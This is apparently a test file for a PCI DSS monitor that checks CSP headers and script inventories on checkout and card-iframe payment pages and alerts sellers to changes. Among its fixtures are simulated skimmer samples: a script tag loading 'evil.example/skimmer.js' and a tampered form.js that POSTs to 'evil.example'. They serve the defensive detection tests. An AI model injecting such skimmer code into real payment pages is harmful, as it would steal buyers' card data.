// Monitor semanal das páginas de pagamento (PCI DSS 4.0 11.6.1): confere o cabeçalho CSP e o inventário de scripts de
// /c e /o no próprio domínio e avisa o vendedor quando muda. Fetch falso, sem rede.
import { createHash } from "node:crypto";
import { afterAll, beforeAll, describe, expect, spyOn, test } from "bun:test";
import { eq } from "drizzle-orm";
import { cardFormCsp, cardFormHtml } from "@/card-service/page";
import { alertText } from "@/lib/alerts";
import { getHandlers } from "@/lib/jobs/handlers";
import { job, offer, orders, pageCheck, storeAlert } from "@/lib/db/schema";
import { buyerCsp } from "@/proxy";
import { createPciPageMonitorHandler, inspectBuyerPage, inspectCardFormPage, PCI_MONITOR_EVERY_MS } from "@/lib/security/page-monitor";
import { storeCheckoutOrigins } from "@/lib/stores";
import { createTestDb, type TestDb } from "./db";
import { seedOrder, seedPanelStore } from "./panel-helpers";

let t: TestDb;
beforeAll(async () => {
  t = await createTestDb();
});
afterAll(async () => {
  await t.drop();
});

const NONCE = "bm9uY2UtZGUtdGVzdGU=";
const goodHtml = (nonce = NONCE, extra = "") =>
  `<!DOCTYPE html><html><head><script src="/_next/static/chunks/webpack-1a2b3c.js" async="" nonce="${nonce}"></script>` +
  `<script src="/_next/static/chunks/main-app-9f8e.js" async="" nonce="${nonce}"></script></head><body><form></form>` +
  `<script nonce="${nonce}">self.__next_f.push([1,"x"])</script>${extra}</body></html>`;
const goodCsp = (nonce = NONCE) => buyerCsp(nonce, { dev: false, turnstile: false });

describe("inspectBuyerPage", () => {
  test("página como o app gera: sem problemas; inventário estável entre nonces e builds", () => {
    const a = inspectBuyerPage(goodHtml(), goodCsp(), { turnstile: false });
    expect(a.problems).toEqual([]);
    const b = inspectBuyerPage(
      goodHtml("b3V0cm8tbm9uY2UtYWxlYXRvcmlv").replace("webpack-1a2b3c", "webpack-77aa").replace("main-app-9f8e", "main-app-0000"),
      goodCsp("b3V0cm8tbm9uY2UtYWxlYXRvcmlv"),
      { turnstile: false },
    );
    expect(b.problems).toEqual([]);
    expect(b.hash).toBe(a.hash);
  });

  test("sem CSP, CSP diferente, script de outra origem, inline sem nonce: cada um é um problema", () => {
    expect(inspectBuyerPage(goodHtml(), null, { turnstile: false }).problems).toContain("csp_ausente");
    expect(inspectBuyerPage(goodHtml(), goodCsp().replace("object-src 'none'", "object-src *"), { turnstile: false }).problems).toContain("csp_diferente");
    const evil = inspectBuyerPage(goodHtml(NONCE, `<script src="https://evil.example/skimmer.js" nonce="${NONCE}"></script>`), goodCsp(), { turnstile: false });
    expect(evil.problems).toContain("script_nao_autorizado");
    expect(evil.inventory).toContain("https://evil.example/skimmer.js");
    expect(inspectBuyerPage(goodHtml(NONCE, "<script>alert(1)</script>"), goodCsp(), { turnstile: false }).problems).toContain("script_sem_nonce");
    // Turnstile configurado: a política esperada muda junto.
    expect(inspectBuyerPage(goodHtml(), goodCsp(), { turnstile: true }).problems).toContain("csp_diferente");
    // Cartão isolado: o checkout embute o iframe (frame-src do domínio do cartão); sem ele, a política é outra.
    const withFrame = buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: "https://pagar.example.com" });
    expect(inspectBuyerPage(goodHtml(), withFrame, { turnstile: false, cardOrigin: "https://pagar.example.com" }).problems).toEqual([]);
    expect(inspectBuyerPage(goodHtml(), goodCsp(), { turnstile: false, cardOrigin: "https://pagar.example.com" }).problems).toContain("csp_diferente");
  });
});

const CARD = "https://pagar.example.com";
const STORE = "00000000-0000-4000-8000-000000000001";
const ORIGINS = ["https://loja.example.com"];
const formPage = (origins = ORIGINS, extra = "") => ({
  html: cardFormHtml({ storeId: STORE, allowedOrigins: origins }).replace("</body>", `${extra}</body>`),
  csp: cardFormCsp(origins),
});
const inspectForm = (p: { html: string; csp: string | null }, origins = ORIGINS) =>
  inspectCardFormPage(p.html, p.csp, { origins, pageUrl: `${CARD}/form/${STORE}` });

describe("inspectCardFormPage (página do iframe do cartão)", () => {
  test("página como o serviço de cartão gera: sem problemas; só /form.js no inventário (o JSON de configuração não executa)", () => {
    const r = inspectForm(formPage());
    expect(r.problems).toEqual([]);
    expect(r.inventory).toEqual(["self:/form.js"]);
    // Com o sha256 do conteúdo baixado do /form.js: entra no inventário (e no hash guardado).
    const withSha = inspectCardFormPage(formPage().html, formPage().csp, { origins: ORIGINS, pageUrl: `${CARD}/form/${STORE}`, formJsSha256: "ab".repeat(32) });
    expect(withSha.inventory).toEqual([`self:/form.js sha256:${"ab".repeat(32)}`]);
    expect(withSha.hash).not.toBe(r.hash);
    // As origens da loja mudam o frame-ancestors, não o resultado guardado: trocar o domínio da loja não é alerta.
    const other = inspectForm(formPage(["https://outra.example.com"]), ["https://outra.example.com"]);
    expect(other.problems).toEqual([]);
    expect(other.hash).toBe(r.hash);
  });

  test("script de outro host, outro script do próprio domínio ou inline executável: problema", () => {
    const evil = inspectForm(formPage(ORIGINS, `<script src="https://evil.example/skimmer.js"></script>`));
    expect(evil.problems).toContain("script_nao_autorizado");
    expect(evil.inventory).toContain("https://evil.example/skimmer.js");
    expect(inspectForm(formPage(ORIGINS, `<script src="/outro.js"></script>`)).problems).toContain("script_nao_autorizado");
    expect(inspectForm(formPage(ORIGINS, "<script>alert(1)</script>")).problems).toContain("script_inline");
    // O Turnstile fica no checkout (pai), nunca na página do cartão: lá ele é script não autorizado.
    const ts = `<script src="https://challenges.cloudflare.com/turnstile/v0/api.js"></script>`;
    expect(inspectForm(formPage(ORIGINS, ts)).problems).toContain("script_nao_autorizado");
  });

  test("CSP ausente ou diferente da cardFormCsp (inclusive frame-ancestors de outra loja): problema", () => {
    expect(inspectForm({ ...formPage(), csp: null }).problems).toContain("csp_ausente");
    expect(inspectForm({ ...formPage(), csp: cardFormCsp(["https://intrusa.example"]) }).problems).toContain("csp_diferente");
    expect(inspectForm({ ...formPage(), csp: formPage().csp.replace("script-src 'self'", "script-src *") }).problems).toContain("csp_diferente");
    // A política antiga, que liberava a Cloudflare no iframe, também é diferente.
    const old = formPage().csp.replace("script-src 'self'", "script-src 'self' https://challenges.cloudflare.com");
    expect(inspectForm({ ...formPage(), csp: old }).problems).toContain("csp_diferente");
  });

  test("sha256 esperado (do build da mesma revisão): igual passa; diferente é inventario_mudou", () => {
    const sha = "ab".repeat(32);
    const base = { origins: ORIGINS, pageUrl: `${CARD}/form/${STORE}`, formJsSha256: sha };
    expect(inspectCardFormPage(formPage().html, formPage().csp, { ...base, expectedFormJsSha256: sha }).problems).toEqual([]);
    expect(inspectCardFormPage(formPage().html, formPage().csp, { ...base, expectedFormJsSha256: "cd".repeat(32) }).problems).toEqual(["inventario_mudou"]);
    // Sem o arquivo do build (dev): só o histórico decide, como antes.
    expect(inspectCardFormPage(formPage().html, formPage().csp, base).problems).toEqual([]);
  });

  test("aviso do painel e do e-mail dizem que é o formulário do cartão", () => {
    const t = alertText("monitor_pagina_pagamento", { page: "/form", code: "script_nao_autorizado" }, null);
    expect(t.title).toContain("(/form)");
    expect(t.body).toContain("formulário do cartão");
  });
});

async function seedShop() {
  const shop = await seedPanelStore("Loja Monitorada");
  const [o] = await t.ownerDb.select({ slug: offer.slug }).from(offer).where(eq(offer.id, shop.offerId));
  return { ...shop, slug: o!.slug };
}

/** Fetch falso: devolve a página configurada para cada caminho. */
function fakeSite(pages: Record<string, { html: string; csp: string | null; status?: number }>) {
  const calls: string[] = [];
  const urls: string[] = [];
  const fetchFn = (async (input: string | URL | Request) => {
    const url = new URL(String(input instanceof Request ? input.url : input));
    calls.push(url.pathname);
    urls.push(url.href);
    const key = Object.keys(pages).find((k) => url.pathname.startsWith(k));
    const p = key ? pages[key]! : { html: "não encontrado", csp: null, status: 404 };
    return new Response(p.html, { status: p.status ?? 200, headers: { "content-type": "text/html", ...(p.csp ? { "content-security-policy": p.csp } : {}) } });
  }) as typeof fetch;
  return { fetchFn, calls, urls };
}

describe("job pci_page_monitor", () => {
  test("está registrado e roda semanalmente", () => {
    expect(typeof getHandlers().pci_page_monitor).toBe("function");
    expect(PCI_MONITOR_EVERY_MS).toBe(7 * 24 * 60 * 60 * 1000);
  });

  test("1ª conferência ok: guarda o estado sem avisar; mudança no inventário avisa o vendedor uma vez", async () => {
    const shop = await seedShop();
    const ok = fakeSite({ "/c/": { html: goodHtml(), csp: goodCsp() } });
    const run = (f: typeof fetch) => createPciPageMonitorHandler({ fetch: f, storeIds: [shop.storeId] })({} as never, new AbortController().signal);
    await run(ok.fetchFn);
    expect(ok.calls).toEqual([`/c/${shop.slug}`]); // sem pedido ainda: /o fica de fora
    const [first] = await t.ownerDb.select().from(pageCheck).where(eq(pageCheck.storeId, shop.storeId));
    expect(first).toMatchObject({ page: "/c", ok: true });
    expect(await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).toHaveLength(0);

    // Um script novo de outra origem aparece no checkout.
    const bad = fakeSite({ "/c/": { html: goodHtml(NONCE, `<script src="https://cdn.terceiro.example/x.js" nonce="${NONCE}"></script>`), csp: goodCsp() } });
    await run(bad.fetchFn);
    await run(bad.fetchFn);
    const alerts = await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId));
    expect(alerts.map((a) => [a.kind, a.detail])).toEqual([["monitor_pagina_pagamento", { code: "script_nao_autorizado", page: "/c" }]]);
    const notices = (await t.ownerDb.select().from(job).where(eq(job.type, "notify_seller"))).filter((j) => j.storeId === shop.storeId);
    expect(notices.map((n) => (n.payload as { reason?: string }).reason)).toEqual(["monitor_pagina_pagamento"]);
  });

  test("confere também /o com o pedido mais recente; CSP ausente em /o avisa", async () => {
    const shop = await seedShop();
    const order = await seedOrder(shop, { status: "paid" });
    const [{ publicId }] = await t.ownerDb.select({ publicId: orders.publicId }).from(orders).where(eq(orders.id, order.id));
    const site = fakeSite({ "/c/": { html: goodHtml(), csp: goodCsp() }, "/o/": { html: goodHtml(), csp: null } });
    await createPciPageMonitorHandler({ fetch: site.fetchFn, storeIds: [shop.storeId] })({} as never, new AbortController().signal);
    expect(site.calls.sort()).toEqual([`/c/${shop.slug}`, `/o/${publicId}`].sort());
    const alerts = await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId));
    expect(alerts.map((a) => a.detail)).toEqual([{ code: "csp_ausente", page: "/o" }]);
  });

  test("site fora do ar ou resposta não 200: só log, sem aviso e sem mudar o estado guardado", async () => {
    const shop = await seedShop();
    const down = (async () => {
      throw new TypeError("fetch failed");
    }) as unknown as typeof fetch;
    await createPciPageMonitorHandler({ fetch: down, storeIds: [shop.storeId] })({} as never, new AbortController().signal);
    const gone = fakeSite({ "/c/": { html: "erro", csp: null, status: 502 } });
    await createPciPageMonitorHandler({ fetch: gone.fetchFn, storeIds: [shop.storeId] })({} as never, new AbortController().signal);
    expect(await t.ownerDb.select().from(pageCheck).where(eq(pageCheck.storeId, shop.storeId))).toHaveLength(0);
    expect(await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).toHaveLength(0);
  });

  test("cartão isolado: confere também a página do iframe no domínio do cartão; script de outro host avisa com page /form", async () => {
    const shop = await seedShop();
    const origins = await storeCheckoutOrigins(shop.storeId);
    const good = cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins });
    const csp = cardFormCsp(origins);
    const run = (f: typeof fetch) =>
      createPciPageMonitorHandler({ fetch: f, storeIds: [shop.storeId], card: { origin: CARD } })({} as never, new AbortController().signal);

    // Com o iframe, a CSP do checkout ganha frame-src para o domínio do cartão (src/proxy.ts): é a esperada.
    const checkoutCsp = buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD });
    const FORM_JS = "(()=>{/* formulário */})();";
    const ok = fakeSite({ "/c/": { html: goodHtml(), csp: checkoutCsp }, "/form/": { html: good, csp }, "/form.js": { html: FORM_JS, csp: null } });
    await run(ok.fetchFn);
    expect(ok.urls).toContain(`${CARD}/form/${shop.storeId}`);
    expect(ok.urls).toContain(`${CARD}/form.js`);
    const [form] = await t.ownerDb.select().from(pageCheck).where(eq(pageCheck.storeId, shop.storeId)).then((rows) => rows.filter((r) => r.page === "/form"));
    const sha = createHash("sha256").update(FORM_JS).digest("hex");
    expect(form).toMatchObject({ ok: true, inventory: [`self:/form.js sha256:${sha}`] });
    expect(await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).toHaveLength(0);

    const bad = fakeSite({
      "/c/": { html: goodHtml(), csp: checkoutCsp },
      "/form/": { html: good.replace("</body>", `<script src="https://cdn.terceiro.example/x.js"></script></body>`), csp },
      "/form.js": { html: FORM_JS, csp: null },
    });
    await run(bad.fetchFn);
    const alerts = await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId));
    expect(alerts.map((a) => [a.kind, a.detail])).toEqual([["monitor_pagina_pagamento", { code: "script_nao_autorizado", page: "/form" }]]);
    const notices = (await t.ownerDb.select().from(job).where(eq(job.type, "notify_seller"))).filter((j) => j.storeId === shop.storeId);
    expect(notices.map((n) => (n.payload as { page?: string }).page)).toEqual(["/form"]);
  });

  test("cartão isolado: conteúdo do /form.js trocado no mesmo caminho avisa (inventario_mudou) uma vez; form.js fora do ar não muda nada", async () => {
    const shop = await seedShop();
    const origins = await storeCheckoutOrigins(shop.storeId);
    const page = { html: cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins }), csp: cardFormCsp(origins) };
    const checkout = { html: goodHtml(), csp: buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD }) };
    const run = (formJs: { html: string; csp: null; status?: number }) =>
      createPciPageMonitorHandler({ fetch: fakeSite({ "/c/": checkout, "/form/": page, "/form.js": formJs }).fetchFn, storeIds: [shop.storeId], card: { origin: CARD } })(
        {} as never,
        new AbortController().signal,
      );
    const formRow = async () =>
      (await t.ownerDb.select().from(pageCheck).where(eq(pageCheck.storeId, shop.storeId))).find((r) => r.page === "/form");
    const alerts = async () => (await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).map((a) => a.detail);

    await run({ html: "original();", csp: null });
    const first = await formRow();
    expect(first).toMatchObject({ ok: true });
    expect(await alerts()).toEqual([]);

    // Skimmer: mesmo caminho, outro conteúdo. A página e a CSP continuam iguais.
    await run({ html: "original();fetch('https://evil.example',{method:'POST'});", csp: null });
    await run({ html: "original();fetch('https://evil.example',{method:'POST'});", csp: null });
    expect(await alerts()).toEqual([{ code: "inventario_mudou", page: "/form" }]);
    const changed = await formRow();
    expect(changed!.hash).not.toBe(first!.hash);

    // /form.js indisponível: sem conferência (não grava nem avisa).
    await run({ html: "erro", csp: null, status: 502 });
    expect((await formRow())!.hash).toBe(changed!.hash);
    expect(await alerts()).toHaveLength(1);
  });

  test("cartão isolado: form.js diferente do build desta revisão avisa já na 1ª conferência e sai em log.error (sem valores)", async () => {
    const shop = await seedShop();
    const origins = await storeCheckoutOrigins(shop.storeId);
    const page = { html: cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins }), csp: cardFormCsp(origins) };
    const checkout = { html: goodHtml(), csp: buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD }) };
    const SERVED = "original();fetch('https://evil.example',{method:'POST'});";
    const BUILT = createHash("sha256").update("original();").digest("hex");
    const out: string[] = [];
    const write = spyOn(process.stdout, "write").mockImplementation(((s: string) => void out.push(String(s))) as never);
    try {
      await createPciPageMonitorHandler({
        fetch: fakeSite({ "/c/": checkout, "/form/": page, "/form.js": { html: SERVED, csp: null } }).fetchFn,
        storeIds: [shop.storeId],
        card: { origin: CARD },
        expectedFormJsSha256: async () => BUILT,
      })({} as never, new AbortController().signal);
    } finally {
      write.mockRestore();
    }
    const alerts = (await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).map((a) => a.detail);
    expect(alerts).toEqual([{ code: "inventario_mudou", page: "/form" }]);
    const errors = out.map((l) => JSON.parse(l) as { level: string; msg: string; data?: Record<string, unknown> }).filter((r) => r.level === "error");
    expect(errors).toHaveLength(1);
    expect(errors[0]!.data).toEqual({ storeId: shop.storeId, page: "/form", problems: ["inventario_mudou"] });
    expect(JSON.stringify(errors)).not.toContain(BUILT);
  });

  test("cartão isolado: qualquer mudança na conferência do /form (inclusive voltar ao normal) sai em log.error; /c não", async () => {
    const shop = await seedShop();
    const origins = await storeCheckoutOrigins(shop.storeId);
    const page = { html: cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins }), csp: cardFormCsp(origins) };
    const checkoutCsp = buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD });
    const run = async (formPageCsp: string, checkoutHtml: string) => {
      const out: string[] = [];
      const write = spyOn(process.stdout, "write").mockImplementation(((s: string) => void out.push(String(s))) as never);
      try {
        await createPciPageMonitorHandler({
          fetch: fakeSite({ "/c/": { html: checkoutHtml, csp: checkoutCsp }, "/form/": { ...page, csp: formPageCsp }, "/form.js": { html: "x();", csp: null } }).fetchFn,
          storeIds: [shop.storeId],
          card: { origin: CARD },
          expectedFormJsSha256: async () => null,
        })({} as never, new AbortController().signal);
      } finally {
        write.mockRestore();
      }
      return out.map((l) => JSON.parse(l) as { level: string; data?: { page?: string } }).filter((r) => r.level === "error").map((r) => r.data?.page);
    };
    expect(await run(page.csp, goodHtml())).toEqual([]); // 1ª conferência ok: nada
    expect(await run(page.csp.replace("script-src 'self'", "script-src *"), goodHtml())).toEqual(["/form"]);
    expect(await run(page.csp, goodHtml())).toEqual(["/form"]); // voltou: também é mudança
    // Checkout com script novo: aviso ao vendedor, sem log.error (não é a página do cartão).
    expect(await run(page.csp, goodHtml(NONCE, `<script src="https://cdn.terceiro.example/x.js" nonce="${NONCE}"></script>`))).toEqual([]);
  });
});
